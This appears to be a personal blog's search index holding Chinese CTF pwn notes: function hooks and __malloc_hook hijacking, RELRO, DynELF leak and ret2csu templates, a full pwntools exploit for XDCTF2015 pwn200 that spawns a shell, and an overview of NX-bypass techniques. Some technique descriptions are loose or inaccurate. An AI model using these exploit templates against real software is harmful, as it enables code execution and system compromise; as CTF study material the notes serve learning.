<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hook</title>
      <link href="/2023/04/18/hook/"/>
      <url>/2023/04/18/hook/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Hook直意为钩子又叫做回调函数，是一种特殊的消息处理机制，它可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理</p><p>在程序中设置钩子，用来在<code>malloc</code>， <code>realloc</code>，<code>free</code>的时候，对其进行检查，可以看到对应的函数调用后的地址是什么</p><p>原理：</p><p>函数的指针可以指向不同的函数，从而完成不同的功能</p><p>设计理念：</p><p>我们在写main函数的时候，可能还不知道它会完成什么功能，这时候留下函数指针作为接口，可以挂上不同的函数完成不同的功能，究竟执行什么功能由钩子函数的编写者完成</p><p>案例：</p><pre class="line-numbers language-none"><code class="language-none">#include &quot;stdio.h&quot; void fun1(void)&#123;    printf(&quot;i am fun1\r\n&quot;);&#125; void fun2(void)&#123;    printf(&quot;i am fun2\r\n&quot;);&#125; int main(int argc, char const *argv[])&#123;    void (* fun)(void); &#x2F;&#x2F;定义一个函数指针      fun &#x3D; fun1;&#x2F;&#x2F; 让fun指向fun1（首地址）    fun();&#x2F;&#x2F; 执行fun        fun &#x3D; fun2;   &#x2F;&#x2F; 让fun指向fun2（首地址）    fun(); &#x2F;&#x2F; 执行fun     return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：<br><img src="https://ywhkkx.github.io/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638893957283-1639312427470.png"></p><p>这里的函数“fun1”和函数“fun2”就是hook</p><p>把函数指针fun指向fun1和fun2的过程称为“挂钩子”</p><p>​ &#x2F;&#x2F; 在嵌入式系统中，底层不知道应用层需要完成什么功能， 往往会提供像这样子的函数回调方式供应用层使用</p><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h2><p>malloc_hook本质上讲是一个指针变量，指向一个“检查函数”</p><blockquote><p>void * function(size_t size, void * caller)<br>​ &#x2F;&#x2F;其中caller是表示在栈中调用malloc的函数的时候的函数地址，%p可以打印出它的地址</p></blockquote><p>在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在（已经挂钩），将调用malloc_hook指向的call rax的地址（malloc调用之后的地址）</p><p>简单来说：执行malloc时，malloc_hook也会执行</p><p>案例：</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;malloc.h&gt;void *fun() &#123;    __malloc_hook &#x3D; NULL;    printf(&quot;hello,fun was called!\n&quot;);    return NULL;&#125;int main() &#123;    __malloc_hook &#x3D; fun;    malloc(10);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>malloc_hook指向了fun的首地址（挂钩子）</p><p>程序在执行malloc时就会执行fun，而不是“检查函数”（钩子已切换）</p><p>利用：</p><p>malloc_hook位于main_arena上方0x10的位置，可以通过fake chunk来overwrite该值实现getshell<br><a href="https://ywhkkx.github.io/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/">上面参考yhellow</a><br><a href="https://blog.csdn.net/A951860555/article/details/115462494">详参</a></p><h2 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h2><p><a href="https://blog.csdn.net/A951860555/article/details/115766826">https://blog.csdn.net/A951860555/article/details/115766826</a></p><h2 id="Hook函数劫持应用"><a href="#Hook函数劫持应用" class="headerlink" title="Hook函数劫持应用"></a>Hook函数劫持应用</h2><p><a href="https://forum.butian.net/share/437">pwn时劫持通过劫持各种hook从而劫持程序控制流的技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零碎知识点</title>
      <link href="/2023/04/18/ling-sui-zhi-shi-dian/"/>
      <url>/2023/04/18/ling-sui-zhi-shi-dian/</url>
      
        <content type="html"><![CDATA[<h2 id="题目防护措施"><a href="#题目防护措施" class="headerlink" title="题目防护措施"></a>题目防护措施</h2><h3 id="RELRO（重定位只读）"><a href="#RELRO（重定位只读）" class="headerlink" title="RELRO（重定位只读）"></a>RELRO（重定位只读）</h3><p><code>主要针对 GOT 改写的攻击方式</code></p><p>分为Partial RELRO 和 Full RELRO 两种</p><ul><li><p>Partial RELRO:在程序装入后，将其中一段 (如.dynamic) 标记为只读，防止程序的一些重定位信息被修改</p></li><li><p>Full RELRO: 在Partial RELRO的基础上，在程序装入时，直接解析完所有符号并填入对应的值，此时所有的 GOT 表项都已初始化，且不装入 link_map 与_dl_runtime_resolve 的地址 (二者都是程序动态装载的重要结构和函数)。</p></li></ul><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。RELRO 为” Partial RELRO”, 说明我们对 GOT 表具有写权限。</p><p><a href="https://lantern.cool/note-pwn-linux-protect/">参考</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux动态链接</title>
      <link href="/2023/04/16/linux-dong-tai-lian-jie/"/>
      <url>/2023/04/16/linux-dong-tai-lian-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="plt-amp-got"><a href="#plt-amp-got" class="headerlink" title="plt&amp;got"></a>plt&amp;got</h2><p><a href="https://blog.csdn.net/linyt/category_6267121.html">参考</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux动态链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XDCTF2015-pwn200</title>
      <link href="/2023/04/16/xdctf2015-pwn200/"/>
      <url>/2023/04/16/xdctf2015-pwn200/</url>
      
        <content type="html"><![CDATA[<h1 id="一-DynELF方法"><a href="#一-DynELF方法" class="headerlink" title="一.DynELF方法"></a>一.DynELF方法</h1><p>具体参考：<br><a href="https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/">https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/</a><br><a href="https://www.anquanke.com/post/id/85129">https://www.anquanke.com/post/id/85129</a></p><h2 id="1-DynELF简介"><a href="#1-DynELF简介" class="headerlink" title="1.DynELF简介"></a>1.DynELF简介</h2><h3 id="1-1前言"><a href="#1-1前言" class="headerlink" title="1.1前言"></a>1.1前言</h3><p>在没有目标系统文件的情况下，可以通过使用pwntools的DynELF模块来泄露地址信息，从而获取到shell.</p><h3 id="1-2基本原理"><a href="#1-2基本原理" class="headerlink" title="1.2基本原理"></a>1.2基本原理</h3><p>DynELF 技术的原理是通过动态加载和链接共享库，并使用 dlsym() 函数查找共享库中的符号，从而实现程序的灵活性和可扩展性。在 CTF 中，我们可以利用 DynELF 来解决一些和导入表相关的问题，例如查找加密函数的地址、解密字符串等。<br>主要使用条件：<br>1）目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；<br>2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</p><h3 id="1-3代码模板"><a href="#1-3代码模板" class="headerlink" title="1.3代码模板"></a>1.3代码模板</h3><h4 id="1-3-1基本模板"><a href="#1-3-1基本模板" class="headerlink" title="1.3.1基本模板"></a>1.3.1基本模板</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./xxx'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#各种预处理</span>  payload <span class="token operator">=</span> <span class="token string">"xxxxxxxx"</span> <span class="token operator">+</span> address <span class="token operator">+</span> <span class="token string">"xxxxxxxx"</span>  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment">#各种处理</span>  data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  log<span class="token punctuation">.</span>debug<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token punctuation">(</span>data <span class="token keyword">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> datad <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span> elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#初始化DynELF模块 </span>systemAddress <span class="token operator">=</span> d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">)</span>  <span class="token comment">#在libc文件中搜索system函数的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3-2基于puts的模板"><a href="#1-3-2基于puts的模板" class="headerlink" title="1.3.2基于puts的模板"></a>1.3.2基于puts的模板</h4><p>puts遇到“\x00”会中断，并且会在字符串结尾自动加上’\n’，非常不适合leak函数。</p><p>64位：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>     payload <span class="token operator">=</span> padding <span class="token operator">+</span> fake_rbp    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>     payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_address<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>     p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">)</span>    count <span class="token operator">=</span> <span class="token number">0</span>     data <span class="token operator">=</span> <span class="token string">''</span>     up <span class="token operator">=</span> <span class="token string">""</span>     <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>         count <span class="token operator">+=</span> <span class="token number">1</span>         <span class="token keyword">if</span> up <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token keyword">and</span> c <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>             data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>             data <span class="token operator">+=</span> <span class="token string">"\x00"</span>            <span class="token keyword">break</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>             data <span class="token operator">+=</span> c         up <span class="token operator">=</span> c     data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'%x -> %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>32位：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>  count <span class="token operator">=</span> <span class="token number">0</span>  data <span class="token operator">=</span> <span class="token string">''</span>  payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret_address<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>address<span class="token punctuation">)</span>  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token keyword">print</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">)</span>   up <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>     count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> up <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token keyword">and</span> c <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>        buf <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                   buf <span class="token operator">+=</span> <span class="token string">"\x00"</span>      <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      buf <span class="token operator">+=</span> c    up <span class="token operator">=</span> c  data <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'%x -> %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数据接收那里很容易出问题，并且必须要有“ p.recvuntil(‘xxxx’) ”</p><p>因为程序在运行的过程中会输出一些字符串，可能会干扰数据接收的过程</p><h4 id="1-3-3基于write的模板"><a href="#1-3-3基于write的模板" class="headerlink" title="1.3.3基于write的模板"></a>1.3.3基于write的模板</h4><p>64位：</p><pre class="line-numbers language-none"><code class="language-none">def leak(addr):     payload &#x3D; padding + fake_rbp    payload +&#x3D; p64(pop_rdi_ret) + p64(1)    payload +&#x3D; p64(pop_rsi_ret) + p64(addr)    payload +&#x3D; p64(pop_rdx_ret) + p64(8)    payload +&#x3D; p64(write_plt) + p64(ret_address)    p.send(payload)    p.recvuntil(&#39;xxxx&#39;)    data &#x3D; p.recv(8)    log.success(&#39;%x -&gt; %s&#39;%(addr,hex(u64(data))))    return datad &#x3D; DynELF(leak,elf &#x3D; elf)function_libc &#x3D; d.lookup(&#39;function&#39;,&#39;libc&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>32位：</p><pre class="line-numbers language-none"><code class="language-none">def leak(address):    payload &#x3D; padding + fake_rbp    payload +&#x3D; p32(write_plt) + p32(ret_address)     payload +&#x3D; p32(1) + p32(address) + p32(4)    p.sendline(payload)    p.recvuntil(&#39;xxxx&#39;)    data &#x3D; p.recv(4)     log.success(&#39;%x -&gt; %s&#39;%(address,hex(u32(data))))    return datad &#x3D; DynELF(leak,elf &#x3D; elf)function_libc &#x3D; d.lookup(&#39;function&#39;,&#39;libc&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配合万能pop，代码如下：</p><pre class="line-numbers language-none"><code class="language-none">def leak(addr):     csu(0, 1, write_got, 8, addr, 1, main_addr)    p.recvuntil(&#39;xxxx&#39;)     data &#x3D; p.recv(8)    log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (data or &#39;&#39;).encode(&#39;hex&#39;)))     return data#当然，配合puts也是可以的（puts和write就只有接收部分不同）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3-4-补充：万能pop模板"><a href="#1-3-4-补充：万能pop模板" class="headerlink" title="1.3.4 补充：万能pop模板"></a>1.3.4 补充：万能pop模板</h4><p>当程序的常规gadgets不能满足需求时（通常是缺少“pop_rdx”），就需要万能pop<br>如果用csu进行寄存器赋值，需要两个重要的ROPgadgets：</p><p>csu_front_addr:<br><img src="https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126255915-1642995722008-1647496563602.png"><br>csu_end_addr:<br><img src="https://ywhkkx.github.io/2022/01/02/%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF/1641126386447-1642995722010-1647496563602.png"></p><p><code>不同的程序csu可能不同（寄存器顺序不同），一定要确认并修改</code></p><pre class="line-numbers language-none"><code class="language-none">csu_front_addr&#x3D;csu_end_addr&#x3D;def csu(rbx, rbp, r12, r13, r14, r15, last):    # pop rbx,rbp,r12,r13,r14,r15    # rbx should be 0,    # rbp should be 1,enable not to jump    # r12 should be the function we want to call(只能是got表地址)    # rdi&#x3D;edi&#x3D;r15d    # rsi&#x3D;r14    # rdx&#x3D;r13    # csu(0, 1, fun_got, rdx, rsi, rdi, last)    payload &#x3D; padding + fake_ebp    payload +&#x3D; p64(csu_end_addr)     payload +&#x3D; p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)    payload +&#x3D; p64(csu_front_addr)    payload +&#x3D; b&#39;a&#39; * 0x38    payload +&#x3D; p64(last)    p.send(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fun_got也可以是指向函数首地址的指针</p><p>例子：</p><pre class="line-numbers language-none"><code class="language-none">csu(0, 1, write_got, 8, bss_addr, 1, main_addr)#执行write(1,bss_addr,8)后，执行main_addrcsu(0, 1, read_got, 8, bss_addr, 0, main_addr)#执行read(0,bss_addr,8)后，执行main_addr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2.解题思路"></a>2.解题思路</h2><p>checksec下32位，除了canary没开，其他保护全开。</p><p>借助DynELF实现利用的点：<br>1）调用write函数来泄露地址信息，比较方便；<br>2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；<br>3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；<br>4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p><p>exp:</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *p &#x3D; process(&quot;.&#x2F;XDCTF_2015_pwn200&quot;)elf &#x3D; ELF(&quot;.&#x2F;XDCTF_2015_pwn200&quot;)write_plt &#x3D; elf.symbols[&#39;write&#39;]ret_addr &#x3D; 0x080484B  #vuln_addrstart_addr &#x3D; 0x080483D0read_plt &#x3D; elf.symbols[&#39;read&#39;]ppp_ret_addr &#x3D; 0x0804856Cbss_addr &#x3D; 0x0804A020#用来写入&#39;&#x2F;bin&#x2F;sh&#39;def leak(addr):    payload1 &#x3D; b&#39;A&#39; * 108 + b&quot;BBBB&quot;    payload1 +&#x3D; p32(write_plt) + p32(ret_addr)    payload1 +&#x3D; p32(1) + p32(addr) + p32(4)    p.send(payload1)    data &#x3D; p.recv(4)    log.success(&#39;%x -&gt; %s&#39;%(addr,hex(u32(data))))    return dataprint p.recvline()d &#x3D; DynELF(leak,elf &#x3D; ELF(&quot;.&#x2F;XDCTF_2015_pwn200&quot;))sys_addr &#x3D; d.lookup(&quot;system&quot;, &quot;libc&quot;)print &quot;system address:&quot;, hex(sys_addr)#调用_start函数，恢复栈payload2 &#x3D; b&#39;A&#39; * 112 + p32(start_addr)p.send(payload2)p.recv()payload3 &#x3D; b&#39;A&#39; * 112 + p32(read_plt) + p32(ppp_ret_addr) +         p32(0) + p32(bss_addr) + p32(8) +         p32(sys_addr) + p32(ret_addr) + p32(bss_addr)p.send(payload3)p.send(&#39;&#x2F;bin&#x2F;sh&#39;)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="二-ret2-dl-runtime-resolve方法"><a href="#二-ret2-dl-runtime-resolve方法" class="headerlink" title="二.ret2_dl_runtime_resolve方法"></a>二.ret2_dl_runtime_resolve方法</h1><p>参考：<br><a href="https://ctf-wiki.org/executable/elf/structure/basic-info/">https://ctf-wiki.org/executable/elf/structure/basic-info/</a><br><a href="https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502">https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502</a><br><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p><h2 id="1-基本知识"><a href="#1-基本知识" class="headerlink" title="1.基本知识"></a>1.基本知识</h2><h3 id="1-1Linux动态链接"><a href="#1-1Linux动态链接" class="headerlink" title="1.1Linux动态链接"></a>1.1Linux动态链接</h3><p>参考我的另一篇博客，<a href="http://tcrestart.github.io/2023/04/16/linux-dong-tai-lian-jie/">Linux动态链接</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> writeup </tag>
            
            <tag> DynELF </tag>
            
            <tag> ret2_dl_runtime_resolve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off-by-one</title>
      <link href="/2023/04/14/off-by-one/"/>
      <url>/2023/04/14/off-by-one/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过NX</title>
      <link href="/2023/04/13/rao-guo-nx/"/>
      <url>/2023/04/13/rao-guo-nx/</url>
      
        <content type="html"><![CDATA[<h2 id="1-绕过NX保护的几种常见方法"><a href="#1-绕过NX保护的几种常见方法" class="headerlink" title="1.绕过NX保护的几种常见方法"></a>1.绕过NX保护的几种常见方法</h2><h3 id="1-Return-to-libc攻击"><a href="#1-Return-to-libc攻击" class="headerlink" title="1.Return-to-libc攻击"></a>1.Return-to-libc攻击</h3><p>利用程序中已经存在的GOT表项和PLT表项，将程序流程跳转到libc库的某个函数，从而绕过NX保护。<br>例如，在一个程序中存在一个漏洞，可以通过溢出栈来覆盖函数调用时保存返回地址的位置。如果该程序被编译成启用了NX保护，则无法直接在栈上注入shellcode。但是，我们可以利用libc库中已有的函数来实现任意指令执行。比如，我们可以覆盖函数调用时的返回地址为system()函数的地址，然后将需要执行的命令作为参数传递给system()函数。<br><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#fdaxg">具体参考</a></p><h3 id="2-Return-to-ROP攻击"><a href="#2-Return-to-ROP攻击" class="headerlink" title="2.Return-to-ROP攻击"></a>2.Return-to-ROP攻击</h3><p>利用程序中一些已有的代码段或者库中的代码段，构造ROP链实现任意指令执行。具体来说，通过伪造栈帧，将多个gadget组合起来构成ROP链，从而跳转到程序中其他位置执行恶意代码。<br>例如，在某个程序中存在一个漏洞，我们可以通过缓冲区溢出来控制程序的执行流程，但是无法直接执行任意指令。这种情况下，我们可以使用ROP技术来构造一条由多个gadget组成的链，从而达到执行任意指令的目的。下面是一些常见的gadget类型：<br>pop reg; ret：弹出寄存器reg的值，并将代码流程跳转到返回地址。<br>mov reg1, reg2; ret：将reg2中的值赋给reg1，并将代码流程跳转到返回地址。<br>add reg1, reg2; ret：将reg1和reg2相加，并将代码流程跳转到返回地址。<br>xor reg1, reg2; ret：将reg1和reg2进行异或，并将代码流程跳转到返回地址。<br>call [reg];：调用寄存器reg中存储的函数地址<br>可以使用ROPgadget等工具自动化生成ROP链<br><a href="https://ropemporium.com/challenge/split.html">例题</a><br><a href="https://xz.aliyun.com/t/3402">ROP</a><a href="https://hollk.blog.csdn.net/article/details/105913705?spm=1001.2014.3001.5502">BROP</a><a href="https://hollk.blog.csdn.net/article/details/107512670?spm=1001.2014.3001.5502">SROP</a></p><h3 id="3-Ret2dlresolve攻击"><a href="#3-Ret2dlresolve攻击" class="headerlink" title="3.Ret2dlresolve攻击"></a>3.Ret2dlresolve攻击</h3><p>通过覆盖GOT表项，将程序跳转到自己编写的dlresolve函数，通过解析动态链接库中的符号，获取需要的函数地址，再跳转到该函数实现任意指令执行和代码注入。<br>Ret2dlresolve攻击可以通过覆盖程序的GOT表或PLT表，将程序跳转到自定义的解析动态链接库符号的函数中，获取到需要调用的函数地址，并将程序流程跳转到该函数。下面是一个简单的实例，在某个程序中存在栈溢出漏洞，我们可以利用Ret2dlresolve攻击来执行任意指令。具体来说，我们可以构造一个伪造的DT_NEEDED段，然后在程序中使用dlopen()函数打开这个动态链接库，从而使得程序在运行时会解析这个DT_NEEDED段中的符号。接着，我们可以通过覆盖GOT表项，将程序跳转到我们自己编写的dlresolve函数，该函数会解析需要调用的函数地址并返回给程序，最终跳转到该函数实现代码注入<br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">具体参考1</a><br><a href="https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502">具体参考2</a></p><h3 id="4-ret2plt攻击"><a href="#4-ret2plt攻击" class="headerlink" title="4.ret2plt攻击"></a>4.ret2plt攻击</h3><p>可以通过覆盖程序的PLT表项，将程序跳转到某个库函数的PLT入口，在绕过NX保护的同时，也可以实现代码注入。<br>在某个程序中存在栈溢出漏洞，但是启用了NX保护。我们可以使用ret2plt攻击，通过覆盖程序的PLT表项，将程序跳转到某个库函数的PLT入口，并向函数传递参数，从而实现代码注入和任意指令执行。例如，我们可以使用libc库中的system()函数来执行任意命令。具体来说，我们可以通过覆盖程序的PLT表项，将程序跳转到system()函数的PLT入口，然后将需要执行的命令作为参数传递给system()函数。<br><a href="https://ctftime.org/task/13273">例题</a><br><a href="https://blog.csdn.net/guilanl/article/details/70227392">具体参考</a></p><h3 id="5-使用栈迁移技术"><a href="#5-使用栈迁移技术" class="headerlink" title="5.使用栈迁移技术"></a>5.使用栈迁移技术</h3><p>在一些特殊情况下，无法直接修改返回地址，但是可以通过栈迁移技术，将栈上存储的数据移动到另外一块内存区域，从而绕过NX保护。<br>在某些情况下，无法直接修改返回地址或者调用其他函数来实现代码注入。但是，我们可以使用栈迁移技术，在栈上创建一块新的内存区域，将原始的栈数据复制到这里，然后在新的栈上进行操作。具体来说，我们可以通过覆盖函数调用时的参数，使得程序执行到一个特定的函数，该函数会执行栈迁移操作。栈迁移函数会在堆上申请一块新的内存区域，将原始的栈数据复制到这个区域中，并且修改返回地址，使得程序在执行完栈迁移操作后会跳转到新的栈上。在新的栈上，我们可以自由地进行任意指令执行和代码注入。<br><a href="https://www.cnblogs.com/max1z/p/15299000.html">具体参考</a></p><h3 id="6-JIT（Just-In-Time）编译攻击"><a href="#6-JIT（Just-In-Time）编译攻击" class="headerlink" title="6.JIT（Just-In-Time）编译攻击"></a>6.JIT（Just-In-Time）编译攻击</h3><p>创建一个可执行内存区域，将shellcode动态生成到这个区域，并且跳转到该区域执行代码。<br>JIT攻击通常需要程序本身存在一定的漏洞，如栈溢出漏洞等。下面是一个简单的实例，在某个程序中存在栈溢出漏洞，我们可以构造恶意输入，使得程序执行时会将shellcode写入一个可执行的内存区域，并且跳转到该区域执行。例如，我们可以使用mmap()函数将一块可读写可执行的内存映射到进程空间，然后将shellcode写入这个内存区域，并手动在栈上伪造一个返回地址，使得程序执行完shellcode后会跳转到正确的位置。<br><a 